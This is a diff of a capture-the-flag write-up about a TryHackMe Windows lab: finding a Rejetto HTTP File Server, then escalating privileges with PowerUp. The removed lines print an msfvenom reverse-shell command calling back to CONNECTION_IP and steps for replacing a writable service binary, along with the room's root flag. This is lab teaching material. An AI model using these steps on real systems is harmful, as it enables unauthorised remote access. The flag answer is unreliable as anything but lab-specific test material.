@@ -20,14 +20,14 @@ Here we have a website displaying the Employee of the month. But what we need is
 
 From the source code we can find the name of the Employee of the month.
 
-So the next question reads "Scan the machine with nmap. What is the other port running a web server on". Looking back to our nmap scan we can see port **8080** is open and is running a http web server.
+**Question**: "Scan the machine with nmap. What is the other port running a web server on". Looking back to our nmap scan we can see port **8080** is open and is running a http web server.
 
 Next question "Take a look at the other web server. What file server is running?". Once we navigate to the second web server and click on the link as shown below we are met with the name of the file server which is **Rejetto Http File Server**
 
 ![](images/20230912200320.png)
 ![](images/20230912200338.png)
 
-"What is the CVE number to exploit this file server?".  A quick search on [exploitdb](https://www.exploit-db.com/) give us our answer.
+**Question**: "What is the CVE number to exploit this file server?".  A quick search on [exploitdb](https://www.exploit-db.com/) give us our answer.
 
 ![](images/20230912200413.png)
 
@@ -59,30 +59,9 @@ So from experience of previous CTFs we should know the flag might be in the user
 # Privilege Escalation
 Now that you have an initial shell on this Windows machine as the user Bill, we can further enumerate the machine and escalate our privileges to NT AUTHORITY\\SYSTEM!
 
-From tryhackme:
-*To enumerate this machine, we will use a powershell script called PowerUp, It's purpose is to evaluate a Windows machine and determine any abnormalities - "_PowerUp aims to be a clearinghouse of common Windows privilege escalation_ _vectors that rely on misconfigurations."*
+To enumerate this machine, we will use a powershell script called [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1), It's purpose is to evaluate a Windows machine and determine any abnormalities - "_PowerUp aims to be a clearinghouse of common Windows privilege escalation_ _vectors that rely on misconfigurations."
 
-*You can download the script [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).  If you want to download it via the command line, be careful not to download the GitHub page instead of the raw script. Now you can use the **upload** command in Metasploit to upload the script.*
-
-![](images/20230912203018.png)
-
-To execute this using Meterpreter, I will type **load powershell** into meterpreter. Then I will enter powershell by entering **powershell_shell**:
-
-![](images/20230912203036.png)
-
-Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an _unquoted service path_ vulnerability? **AdvancedSystemCareService9**
-
-The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
-
-Use msfvenom to generate a reverse shell as an Windows executable.
-
-`msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
-
-Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.  
-
-**Note:** The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.
-
-What is the root flag? **9af5f314f57607c00fd09803a587db80**
+**Question**: "What is the root flag?"
 
 After downloading the PowerUp.ps1 privesc script we can upload the script to our windows machine and enumerate for privilege escalation vectors that rely on misconfigurations.
 
